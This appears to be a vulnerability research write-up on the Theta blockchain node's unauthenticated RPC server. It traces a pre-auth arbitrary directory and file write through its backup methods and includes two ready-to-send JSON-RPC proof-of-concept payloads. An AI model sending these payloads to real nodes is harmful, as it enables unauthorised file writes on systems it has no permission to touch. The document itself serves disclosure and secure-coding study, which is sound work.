# Theta RPC Backup File Write — 2026-08 Case Study

## Scope
- Repo: `/root/theta-hunt/ledger/rpc/` (Theta node)
- Adaptor: `/root/theta-hunt/eth-rpc/rpc/` (theta-eth-rpc-adaptor)

## Trust Graph
- `server.go:84-94`: `rpc.NewServer()` + `s.RegisterName("theta", t.ThetaRPCService)` exposes all exported methods of `ThetaRPCService` as `theta.<Method>` over HTTP `/rpc` and WebSocket `/ws`.
- `server.go:90-94`: only `corsMiddleware` (Allow-Origin `*`) and a timeout handler. **No authentication.**
- `common/config.go:233-234`: default bind `0.0.0.0:16888`; enabled by `rpc.enabled`.
- Go `net/rpc` dispatch is restricted to exported methods with signature `func (t *T) Method(args *A, reply *R) error` — arbitrary reflection dispatch is impossible.

## Confirmed Finding: Pre-auth Arbitrary File/Directory Write

### Source
`ledger/rpc/backup.go` (all three methods take a user-controlled `Config` string):
- `BackupSnapshot` (`backup.go:23-51`)
- `BackupChain` (`backup.go:67-83`)
- `BackupChainCorrection` (`backup.go:99-116`)

### Sink
- `backup.go:72-75`: `backupDir := path.Join(args.Config, "backup", "chain")` → `os.MkdirAll(backupDir, os.ModePerm)` (0777).
- `ledger/snapshot/chain_export.go:42-43`: `os.Create(path.Join(backupDir, filename))` where `filename = "theta_chain-<start>-<end>-<date>"`.
- Same pattern in `snapshot_export.go:50-52` (`theta_snapshot-*`) and `chain_correction_export.go:58-60` (`theta_chain_correction-*`).

### Kill tests
- **Path validation?** None. `args.Config` is used verbatim; absolute paths work directly.
- **Filename control?** No — server-generated, fixed pattern.
- **Content control?** Partial — attacker-submitted tx data (e.g. SmartContractTx payload) survives RLP encoding into the backup file.
- **Prerequisite?** `start..end` must contain a finalized block; trivial on a synced node.

### Verdict
Pre-auth arbitrary directory creation (0777) + arbitrary file create/truncate with predictable fixed-pattern name and partially attacker-influenced content. Not RCE alone; needs a second link (consumer of dropped files, or filename-influencing bug).

## PoC Payloads

### BackupChain
```json
POST http://<node>:16888/rpc
{"jsonrpc":"2.0","method":"theta.BackupChain",
 "params":[{"config":"/tmp/poc_owned","start":1,"end":200}],"id":1}
```
Expected: file created at `/tmp/poc_owned/backup/chain/theta_chain-1-...-2026-08-13`.

### BackupSnapshot
```json
{"jsonrpc":"2.0","method":"theta.BackupSnapshot",
 "params":[{"config":"/tmp/poc2","height":0,"version":2}],"id":1}
```

## Other RPC Methods Audited (no sinks)
- `tx.go`: `BroadcastRawTransaction`, `BroadcastRawTransactionAsync`, `BroadcastRawEthTransaction`, `BroadcastRawEthTransactionAsync` — mempool/broadcast only.
- `call.go`: `CallSmartContract` — `vm.Execute` on a delivered-state snapshot; dry-run, not committed to global state.
- `query.go`: all read-only getters (`GetAccount`, `GetBlock`, `GetBlocksByRange`, etc.). No file/exec sinks.

## eth-rpc Adaptor
- `eth-rpc/rpc/server.go`: go-ethereum `rpc` server, namespaces `net`, `eth`, `web3`, `evm`.
- `evmrpc.NewEvmRPCService` is commented out in `getAPIs()`.
- All `ethrpc` methods are query/relay (`GetBalance`, `GetBlockByNumber`, `SendRawTransaction`, etc.). No file/exec sinks found.

## Key Lesson
Admin backup operations intended for local CLI (`thetacli backup ...`) were registered on the same unauthenticated public RPC server. Any RPC method that takes a `config`/`dir`/`path` string and feeds it to `path.Join` + `os.MkdirAll` + `os.Create` should be treated as a pre-auth file-write candidate.
